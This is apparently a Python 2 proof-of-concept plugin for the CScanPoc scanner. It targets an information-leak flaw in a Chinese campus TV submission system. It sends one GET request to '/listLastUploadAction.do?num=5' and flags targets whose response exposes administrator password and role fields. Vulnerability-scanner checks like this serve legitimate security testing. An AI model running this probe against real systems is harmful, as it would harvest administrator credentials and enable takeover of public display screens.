# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'CTVC_0001' # 平台漏洞编号，留空
    name = '华视校园电视 信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2015-03-10'  # 漏洞公布时间
    desc = '''
        华视校园电视网在线投稿系统接口设计不当，
        可获取到管理员的账户，
        利用此账户登录后可进一步全面控制四所高校近400块屏幕媒体（可上传，播放任意内容）。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '华视校园电视网'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '803ab7d3-a17b-40fa-bb5b-b1e03f3a5e03'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-0100173
            payload = "/listLastUploadAction.do?num=5"
            verify_url = self.target + payload 
            #code, head, res, errcode, _ = curl.curl(url )
            r = requests.get(verify_url)

            if r.status_code == 200 and 'password' in r.content and 'uploadUser' in r.content and 'roleId' in r.content:
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

                    
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
